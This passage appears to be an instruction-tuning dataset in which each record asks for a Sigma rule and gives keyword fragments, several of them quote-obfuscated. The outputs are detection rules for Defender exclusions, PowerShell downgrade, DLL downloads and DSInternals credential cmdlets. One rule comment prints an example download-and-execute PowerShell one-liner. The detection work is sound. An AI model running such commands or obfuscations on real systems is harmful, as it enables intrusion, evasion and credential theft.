'EAGkAcwBhAGIAbABlAEIAZQBoAGEAdgBpAG8AcgBNAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'RABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAA'\n            - 'QAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgA'\n            - 'EAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIA'\n            - 'ZABpAHMAYQBiAGwAZQByAGUAYQBsAHQAaQBtAGUAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAcgBlAGEAbAB0AGkAbQBlAG0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'kAGkAcwBhAGIAbABlAHIAZQBhAGwAdABpAG0AZQBtAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'ZABpAHMAYQBiAGwAZQBpAG8AYQB2AHAAcgBvAHQAZQBjAHQAaQBvAG4AIA'\n            - 'QAaQBzAGEAYgBsAGUAaQBvAGEAdgBwAHIAbwB0AGUAYwB0AGkAbwBuACAA'\n            - 'kAGkAcwBhAGIAbABlAGkAbwBhAHYAcAByAG8AdABlAGMAdABpAG8AbgAgA'\n            - 'ZABpAHMAYQBiAGwAZQBiAGUAaABhAHYAaQBvAHIAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAYgBlAGgAYQB2AGkAbwByAG0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'kAGkAcwBhAGIAbABlAGIAZQBoAGEAdgBpAG8AcgBtAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'ZABpAHMAYQBiAGwAZQBiAGwAbwBjAGsAYQB0AGYAaQByAHMAdABzAGUAZQBuACAA'\n            - 'QAaQBzAGEAYgBsAGUAYgBsAG8AYwBrAGEAdABmAGkAcgBzAHQAcwBlAGUAbgAgA'\n            - 'kAGkAcwBhAGIAbABlAGIAbABvAGMAawBhAHQAZgBpAHIAcwB0AHMAZQBlAG4AIA'\n            - 'RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAEYAdQBsAGwAUwBjAGEAbgA'\n            - 'RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAFEAdQBpAGMAawBTAGMAYQBuAA'\n            - 'RABpAHMAYQBiAGwAZQBBAHIAYwBoAGkAdgBlAFMAYwBhAG4AbgBpAG4AZwA'\n    condition: all of selection_cli_* or 1 of selection_encoded_*\nfalsepositives:\n    - Possible administrative activity\n    - Other Cmdlets that may use the same parameters\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Add-MpPreference Set-MpPreference -ExclusionPath -ExclusionExtension -ExclusionProcess -ExclusionIpAddress", "output": "title: Powershell Defender Exclusion\nid: 17769c90-230e-488b-a463-e05c08e9d48f\nrelated:\n    - id: c1344fa2-323b-4d2e-9176-84b4d4821c88\n      type: similar\nstatus: test\ndescription: Detects requests to exclude files, folders or processes from Antivirus scanning using PowerShell cmdlets\nreferences:\n    - https://learn.microsoft.com/en-us/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-antivirus\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n    - https://twitter.com/AdamTheAnalyst/status/1483497517119590403\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-04-29\nmodified: 2022-05-12\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains:\n            - 'Add-MpPreference '\n            - 'Set-MpPreference '\n    selection2:\n        CommandLine|contains:\n            - ' -ExclusionPath '\n            - ' -ExclusionExtension '\n            - ' -ExclusionProcess '\n            - ' -ExclusionIpAddress '\n    condition: all of selection*\nfalsepositives:\n    - Possible Admin Activity\n    - Other Cmdlets that may use the same parameters\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Add-MpPreference Set-MpPreference \\\"-\\\"\\\"E\\\"\\\"x\\\"\\\"c\\\"\\\"l\\\"\\\"u\\\"\\\"s\\\"\\\"i\\\"\\\"o\\\"\\\"n\\\"\\\"P\\\"\\\"a\\\"\\\"t\\\"\\\"h\\\" -ExclusionExtension -ExclusionProcess -ExclusionIpAddress", "output": "title: Powershell Defender Exclusion\nid: 17769c90-230e-488b-a463-e05c08e9d48f\nrelated:\n    - id: c1344fa2-323b-4d2e-9176-84b4d4821c88\n      type: similar\nstatus: test\ndescription: Detects requests to exclude files, folders or processes from Antivirus scanning using PowerShell cmdlets\nreferences:\n    - https://learn.microsoft.com/en-us/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-antivirus\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n    - https://twitter.com/AdamTheAnalyst/status/1483497517119590403\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-04-29\nmodified: 2022-05-12\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains:\n            - 'Add-MpPreference '\n            - 'Set-MpPreference '\n    selection2:\n        CommandLine|contains:\n            - ' -ExclusionPath '\n            - ' -ExclusionExtension '\n            - ' -ExclusionProcess '\n            - ' -ExclusionIpAddress '\n    condition: all of selection*\nfalsepositives:\n    - Possible Admin Activity\n    - Other Cmdlets that may use the same parameters\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Add-MpPreference -ExclusionPath -ExclusionProcess -ExclusionIpAddress Set-MpPreference -ExclusionExtension", "output": "title: Powershell Defender Exclusion\nid: 17769c90-230e-488b-a463-e05c08e9d48f\nrelated:\n    - id: c1344fa2-323b-4d2e-9176-84b4d4821c88\n      type: similar\nstatus: test\ndescription: Detects requests to exclude files, folders or processes from Antivirus scanning using PowerShell cmdlets\nreferences:\n    - https://learn.microsoft.com/en-us/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-antivirus\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n    - https://twitter.com/AdamTheAnalyst/status/1483497517119590403\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-04-29\nmodified: 2022-05-12\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains:\n            - 'Add-MpPreference '\n            - 'Set-MpPreference '\n    selection2:\n        CommandLine|contains:\n            - ' -ExclusionPath '\n            - ' -ExclusionExtension '\n            - ' -ExclusionProcess '\n            - ' -ExclusionIpAddress '\n    condition: all of selection*\nfalsepositives:\n    - Possible Admin Activity\n    - Other Cmdlets that may use the same parameters\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-name IEHarden -value 0 -name DEPOff -value 1 -name DisableFirstRunCustomize -value 2", "output": "title: Disabled IE Security Features\nid: fb50eb7a-5ab1-43ae-bcc9-091818cb8424\nstatus: test\ndescription: Detects command lines that indicate unwanted modifications to registry keys that disable important Internet Explorer security features\nreferences:\n    - https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-06-19\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains|all:\n            - ' -name IEHarden '\n            - ' -value 0 '\n    selection2:\n        CommandLine|contains|all:\n            - ' -name DEPOff '\n            - ' -value 1 '\n    selection3:\n        CommandLine|contains|all:\n            - ' -name DisableFirstRunCustomize '\n            - ' -value 2 '\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-name IEHarden -value 0 -name DEPOff -value 1 -n\"ame\" DisableFirstRunCustomize -value 2", "output": "title: Disabled IE Security Features\nid: fb50eb7a-5ab1-43ae-bcc9-091818cb8424\nstatus: test\ndescription: Detects command lines that indicate unwanted modifications to registry keys that disable important Internet Explorer security features\nreferences:\n    - https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-06-19\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains|all:\n            - ' -name IEHarden '\n            - ' -value 0 '\n    selection2:\n        CommandLine|contains|all:\n            - ' -name DEPOff '\n            - ' -value 1 '\n    selection3:\n        CommandLine|contains|all:\n            - ' -name DisableFirstRunCustomize '\n            - ' -value 2 '\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-name IEHarden -value 0 -name DEPOff -value 1 -name DisableFirstRunCustomize -value 2", "output": "title: Disabled IE Security Features\nid: fb50eb7a-5ab1-43ae-bcc9-091818cb8424\nstatus: test\ndescription: Detects command lines that indicate unwanted modifications to registry keys that disable important Internet Explorer security features\nreferences:\n    - https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-06-19\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains|all:\n            - ' -name IEHarden '\n            - ' -value 0 '\n    selection2:\n        CommandLine|contains|all:\n            - ' -name DEPOff '\n            - ' -value 1 '\n    selection3:\n        CommandLine|contains|all:\n            - ' -name DisableFirstRunCustomize '\n            - ' -value 2 '\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe -version 2 -versio 2 -versi 2 -vers 2 -ver 2 -ve 2 -v 2", "output": "title: Potential PowerShell Downgrade Attack\nid: b3512211-c67e-4707-bedc-66efc7848863\nrelated:\n    - id: 6331d09b-4785-4c13-980f-f96661356249\n      type: derived\nstatus: test\ndescription: Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0\nreferences:\n    - http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n    - https://github.com/r00t-3xp10it/hacking-material-books/blob/43cb1e1932c16ff1f58b755bc9ab6b096046853f/obfuscation/simple_obfuscation.md#bypass-or-avoid-amsi-by-version-downgrade-\nauthor: Harish Segar (rule)\ndate: 2020-03-20\nmodified: 2023-01-04\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains:\n            - ' -version 2 '\n            - ' -versio 2 '\n            - ' -versi 2 '\n            - ' -vers 2 '\n            - ' -ver 2 '\n            - ' -ve 2 '\n            - ' -v 2 '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe -version 2 -versio 2 -versi 2 -vers 2 \"-ver\" 2 -ve 2 -v 2", "output": "title: Potential PowerShell Downgrade Attack\nid: b3512211-c67e-4707-bedc-66efc7848863\nrelated:\n    - id: 6331d09b-4785-4c13-980f-f96661356249\n      type: derived\nstatus: test\ndescription: Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0\nreferences:\n    - http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n    - https://github.com/r00t-3xp10it/hacking-material-books/blob/43cb1e1932c16ff1f58b755bc9ab6b096046853f/obfuscation/simple_obfuscation.md#bypass-or-avoid-amsi-by-version-downgrade-\nauthor: Harish Segar (rule)\ndate: 2020-03-20\nmodified: 2023-01-04\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains:\n            - ' -version 2 '\n            - ' -versio 2 '\n            - ' -versi 2 '\n            - ' -vers 2 '\n            - ' -ver 2 '\n            - ' -ve 2 '\n            - ' -v 2 '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell -version 2 -versio 2 -versi 2 -vers 2 -ver 2 -ve 2 -v 2", "output": "title: Potential PowerShell Downgrade Attack\nid: b3512211-c67e-4707-bedc-66efc7848863\nrelated:\n    - id: 6331d09b-4785-4c13-980f-f96661356249\n      type: derived\nstatus: test\ndescription: Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0\nreferences:\n    - http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n    - https://github.com/r00t-3xp10it/hacking-material-books/blob/43cb1e1932c16ff1f58b755bc9ab6b096046853f/obfuscation/simple_obfuscation.md#bypass-or-avoid-amsi-by-version-downgrade-\nauthor: Harish Segar (rule)\ndate: 2020-03-20\nmodified: 2023-01-04\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains:\n            - ' -version 2 '\n            - ' -versio 2 '\n            - ' -versi 2 '\n            - ' -vers 2 '\n            - ' -ver 2 '\n            - ' -ve 2 '\n            - ' -v 2 '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe -version 2 -versio 2 -versi 2 -vers 2 -ver 2 -ve 2 -v 2", "output": "title: Potential PowerShell Downgrade Attack\nid: b3512211-c67e-4707-bedc-66efc7848863\nrelated:\n    - id: 6331d09b-4785-4c13-980f-f96661356249\n      type: derived\nstatus: test\ndescription: Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0\nreferences:\n    - http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n    - https://github.com/r00t-3xp10it/hacking-material-books/blob/43cb1e1932c16ff1f58b755bc9ab6b096046853f/obfuscation/simple_obfuscation.md#bypass-or-avoid-amsi-by-version-downgrade-\nauthor: Harish Segar (rule)\ndate: 2020-03-20\nmodified: 2023-01-04\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains:\n            - ' -version 2 '\n            - ' -versio 2 '\n            - ' -versi 2 '\n            - ' -vers 2 '\n            - ' -ver 2 '\n            - ' -ve 2 '\n            - ' -v 2 '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe http://127.0.0.1 %{(IRM $_)} Invoke", "output": "title: Obfuscated PowerShell OneLiner Execution\nid: 44e24481-6202-4c62-9127-5a0ae8e3fe3d\nstatus: test\ndescription: Detects the execution of a specific OneLiner to download and execute powershell modules in memory.\nreferences:\n    - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\n    - https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38\nauthor: '@Kostastsale, TheDFIRReport'\ndate: 2022-05-09\nmodified: 2025-04-16\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1562.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        # Example: powershell -nop -noni -ep bypass -w h -c \"$u=(\"http://127.0.0.1:1337/\"|%%{(IRM $_)});&(\"\".SubString.ToString()[67,72,64]-Join\"\")($u); Import-Module C:\\Users\\EXAMPLE\\Invoke-WMIExec.ps1; Invoke-WMIExec\"\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains|all:\n            - 'http://127.0.0.1'\n            - '%{(IRM $_)}'\n            - 'Invoke'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe http://127.0.0.1 \\\"%{(\\\"IRM $_)} Invoke", "output": "title: Obfuscated PowerShell OneLiner Execution\nid: 44e24481-6202-4c62-9127-5a0ae8e3fe3d\nstatus: test\ndescription: Detects the execution of a specific OneLiner to download and execute powershell modules in memory.\nreferences:\n    - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\n    - https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38\nauthor: '@Kostastsale, TheDFIRReport'\ndate: 2022-05-09\nmodified: 2025-04-16\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1562.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        # Example: powershell -nop -noni -ep bypass -w h -c \"$u=(\"http://127.0.0.1:1337/\"|%%{(IRM $_)});&(\"\".SubString.ToString()[67,72,64]-Join\"\")($u); Import-Module C:\\Users\\EXAMPLE\\Invoke-WMIExec.ps1; Invoke-WMIExec\"\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains|all:\n            - 'http://127.0.0.1'\n            - '%{(IRM $_)}'\n            - 'Invoke'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell http://127.0.0.1 %{(IRM $_)} Invoke", "output": "title: Obfuscated PowerShell OneLiner Execution\nid: 44e24481-6202-4c62-9127-5a0ae8e3fe3d\nstatus: test\ndescription: Detects the execution of a specific OneLiner to download and execute powershell modules in memory.\nreferences:\n    - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\n    - https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38\nauthor: '@Kostastsale, TheDFIRReport'\ndate: 2022-05-09\nmodified: 2025-04-16\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1562.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        # Example: powershell -nop -noni -ep bypass -w h -c \"$u=(\"http://127.0.0.1:1337/\"|%%{(IRM $_)});&(\"\".SubString.ToString()[67,72,64]-Join\"\")($u); Import-Module C:\\Users\\EXAMPLE\\Invoke-WMIExec.ps1; Invoke-WMIExec\"\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains|all:\n            - 'http://127.0.0.1'\n            - '%{(IRM $_)}'\n            - 'Invoke'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe $_)} Invoke http://127.0.0.1 %{(IRM", "output": "title: Obfuscated PowerShell OneLiner Execution\nid: 44e24481-6202-4c62-9127-5a0ae8e3fe3d\nstatus: test\ndescription: Detects the execution of a specific OneLiner to download and execute powershell modules in memory.\nreferences:\n    - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\n    - https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38\nauthor: '@Kostastsale, TheDFIRReport'\ndate: 2022-05-09\nmodified: 2025-04-16\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1562.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        # Example: powershell -nop -noni -ep bypass -w h -c \"$u=(\"http://127.0.0.1:1337/\"|%%{(IRM $_)});&(\"\".SubString.ToString()[67,72,64]-Join\"\")($u); Import-Module C:\\Users\\EXAMPLE\\Invoke-WMIExec.ps1; Invoke-WMIExec\"\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains|all:\n            - 'http://127.0.0.1'\n            - '%{(IRM $_)}'\n            - 'Invoke'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Invoke-WebRequest IWR http OutFile .dll", "output": "title: Potential DLL File Download Via PowerShell Invoke-WebRequest\nid: 0f0450f3-8b47-441e-a31b-15a91dc243e2\nstatus: test\ndescription: Detects potential DLL files being downloaded using the PowerShell Invoke-WebRequest cmdlet\nreferences:\n    - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution\nauthor: Florian Roth (Nextron Systems), Hieu Tran\ndate: 2023-03-13\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Invoke-WebRequest '\n            - 'IWR '\n        CommandLine|contains|all:\n            - 'http'\n            - 'OutFile'\n            - '.dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Invoke-WebRequest IWR \"ht\"tp OutFile .dll", "output": "title: Potential DLL File Download Via PowerShell Invoke-WebRequest\nid: 0f0450f3-8b47-441e-a31b-15a91dc243e2\nstatus: test\ndescription: Detects potential DLL files being downloaded using the PowerShell Invoke-WebRequest cmdlet\nreferences:\n    - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution\nauthor: Florian Roth (Nextron Systems), Hieu Tran\ndate: 2023-03-13\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Invoke-WebRequest '\n            - 'IWR '\n        CommandLine|contains|all:\n            - 'http'\n            - 'OutFile'\n            - '.dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Invoke-WebRequest http IWR OutFile .dll", "output": "title: Potential DLL File Download Via PowerShell Invoke-WebRequest\nid: 0f0450f3-8b47-441e-a31b-15a91dc243e2\nstatus: test\ndescription: Detects potential DLL files being downloaded using the PowerShell Invoke-WebRequest cmdlet\nreferences:\n    - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution\nauthor: Florian Roth (Nextron Systems), Hieu Tran\ndate: 2023-03-13\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Invoke-WebRequest '\n            - 'IWR '\n        CommandLine|contains|all:\n            - 'http'\n            - 'OutFile'\n            - '.dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Add-ADDBSidHistory Add-ADNgcKey Add-ADReplNgcKey ConvertFrom-ADManagedPasswordBlob ConvertFrom-GPPrefPassword ConvertFrom-ManagedPasswordBlob ConvertFrom-UnattendXmlPassword ConvertFrom-UnicodePassword ConvertTo-AADHash ConvertTo-GPPrefPassword ConvertTo-KerberosKey ConvertTo-LMHash ConvertTo-MsoPasswordHash ConvertTo-NTHash ConvertTo-OrgIdHash ConvertTo-UnicodePassword Disable-ADDBAccount Enable-ADDBAccount Get-ADDBAccount Get-ADDBBackupKey Get-ADDBDomainController Get-ADDBGroupManagedServiceAccount Get-ADDBKdsRootKey Get-ADDBSchemaAttribute Get-ADDBServiceAccount Get-ADDefaultPasswordPolicy Get-ADKeyCredential Get-ADPasswordPolicy Get-ADReplAccount Get-ADReplBackupKey Get-ADReplicationAccount Get-ADSIAccount Get-AzureADUserEx Get-BootKey Get-KeyCredential Get-LsaBackupKey Get-LsaPolicy Get-SamPasswordPolicy Get-SysKey Get-SystemKey New-ADDBRestoreFromMediaScript New-ADKeyCredential New-ADNgcKey New-NTHashSet Remove-ADDBObject Save-DPAPIBlob Set-ADAccountPasswordHash Set-ADDBAccountPassword Set-ADDBBootKey Set-ADDBDomainController Set-ADDBPrimaryGroup Set-ADDBSysKey Set-AzureADUserEx Set-LsaPolicy Set-SamAccountPasswordHash Set-WinUserPasswordHash Test-ADDBPasswordQuality Test-ADPasswordQuality Test-ADReplPasswordQuality Test-PasswordQuality Unlock-ADDBAccount Write-ADNgcKey Write-ADReplNgcKey", "output": "title: DSInternals Suspicious PowerShell Cmdlets\nid: 43d91656-a9b2-4541-b7e2-6a9bd3a13f4e\nrelated:\n    - id: 846c7a87-8e14-4569-9d49-ecfd4276a01c\n      type: similar\nstatus: test\ndescription: |\n    Detects execution and usage of the DSInternals PowerShell module. Which can be used to perform what might be considered as suspicious activity such as dumping DPAPI backup keys or manipulating NTDS.DIT files.\n    The DSInternals PowerShell Module exposes several internal features of Active Directory and Azure Active Directory. These include FIDO2 and NGC key auditing, offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups and password hash calculation.\nreferences:\n    - https://github.com/MichaelGrafnetter/DSInternals/blob/39ee8a69bbdc1cfd12c9afdd7513b4788c4895d4/Src/DSInternals.PowerShell/DSInternals.psd1\nauthor: Nasreddine Bencherchali (Nextron Systems), Nounou Mbeiri\ndate: 2024-06-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - 'Add-ADDBSidHistory'\n            - 'Add-ADNgcKey'\n            - 'Add-ADReplNgcKey'\n            - 'ConvertFrom-ADManagedPasswordBlob'\n            - 'ConvertFrom-GPPrefPassword'\n            - 'ConvertFrom-ManagedPasswordBlob'\n            - 'ConvertFrom-UnattendXmlPassword'\n            - 'ConvertFrom-UnicodePassword'\n            - 'ConvertTo-AADHash'\n            - 'ConvertTo-GPPrefPassword'\n            - 'ConvertTo-KerberosKey'\n            - 'ConvertTo-LMHash'\n            - 'ConvertTo-MsoPasswordHash'\n            - 'ConvertTo-NTHash'\n            - 'ConvertTo-OrgIdHash'\n            - 'ConvertTo-UnicodePassword'\n            - 'Disable-ADDBAccount'\n            - 'Enable-ADDBAccount'\n            - 'Get-ADDBAccount'\n            - 'Get-ADDBBackupKey'\n            - 'Get-ADDBDomainController'\n            - 'Get-ADDBGroupManagedServiceAccount'\n            - 'Get-ADDBKdsRootKey'\n            - 'Get-ADDBSchemaAttribute'\n            - 'Get-ADDBServiceAccount'\n            - 'Get-ADDefaultPasswordPolicy'\n            - 'Get-ADKeyCredential' # Covers 'Get-ADKeyCredentialLink'\n            - 'Get-ADPasswordPolicy'\n            - 'Get-ADReplAccount'\n            - 'Get-ADReplBackupKey'\n            - 'Get-ADReplicationAccount'\n            - 'Get-ADSIAccount'\n            - 'Get-AzureADUserEx'\n            - 'Get-BootKey'\n            - 'Get-KeyCredential'\n            - 'Get-LsaBackupKey'\n            - 'Get-LsaPolicy' # Covers 'Get-LsaPolicyInformation'\n            - 'Get-SamPasswordPolicy'\n            - 'Get-SysKey'\n            - 'Get-SystemKey'\n            - 'New-ADDBRestoreFromMediaScript'\n            - 'New-ADKeyCredential' # Covers 'New-ADKeyCredentialLink'\n            - 'New-ADNgcKey'\n            - 'New-NTHashSet'\n            - 'Remove-ADDBObject'\n            - 'Save-DPAPIBlob'\n            - 'Set-ADAccountPasswordHash'\n            - 'Set-ADDBAccountPassword' # Covers 'Set-ADDBAccountPasswordHash'\n            - 'Set-ADDBBootKey'\n            - 'Set-ADDBDomainController'\n            - 'Set-ADDBPrimaryGroup'\n            - 'Set-ADDBSysKey'\n            - 'Set-AzureADUserEx'\n            - 'Set-LsaPolicy' # Covers 'Set-LSAPolicyInformation'\n            - 'Set-SamAccountPasswordHash'\n            - 'Set-WinUserPasswordHash'\n            - 'Test-ADDBPasswordQuality'\n            - 'Test-ADPasswordQuality'\n            - 'Test-ADReplPasswordQuality'\n            - 'Test-PasswordQuality'\n            - 'Unlock-ADDBAccount'\n            - 'Write-ADNgcKey'\n            - 'Write-ADReplNgcKey'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of DSInternals for administration or audit purpose.\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Add-ADDBSidHistory Add-ADNgcKey Add-ADReplNgcKey ConvertFrom-ADManagedPasswordBlob ConvertFrom-GPPrefPassword ConvertFrom-ManagedPasswordBlob ConvertFrom-UnattendXmlPassword ConvertFrom-UnicodePassword ConvertTo-AADHash ConvertTo-GPPrefPassword ConvertTo-KerberosKey ConvertTo-LMHash ConvertTo-MsoPasswordHash ConvertTo-NTHash ConvertTo-OrgIdHash ConvertTo-UnicodePassword Disable-ADDBAccount Enable-ADDBAccount Get-ADDBAccount Get-ADDBBackupKey Get-ADDBDomainController Get-ADDBGroupManagedServiceAccount Get-ADDBKdsRootKey Get-ADDBSchemaAttribute Get-ADDBServiceAccount Get-ADDefaultPasswordPolicy Get-ADKeyCredential Get-ADPasswordPolicy Get-ADReplAccount Get-ADReplBackupKey Get-ADReplicationAccount Get-ADSIAccount Get-AzureADUserEx Get-BootKey Get-KeyCredential Get-LsaBackupKey \\\"Get-LsaPolicy\\\" Get-SamPasswordPolicy Get-SysKey Get-SystemKey New-ADDBRestoreFromMediaScript New-ADKeyCredential New-ADNgcKey New-NTHashSet Remove-ADDBObject Save-DPAPIBlob Set-ADAccountPasswordHash Set-ADDBAccountPassword Set-ADDBBootKey Set-ADDBDomainController Set-ADDBPrimaryGroup Set-ADDBSysKey Set-AzureADUserEx Set-LsaPolicy Set-SamAccountPasswordHash Set-WinUserPasswordHash Test-ADDBPasswordQuality Test-ADPasswordQuality Test-ADReplPasswordQuality Test-PasswordQuality Unlock-ADDBAccount 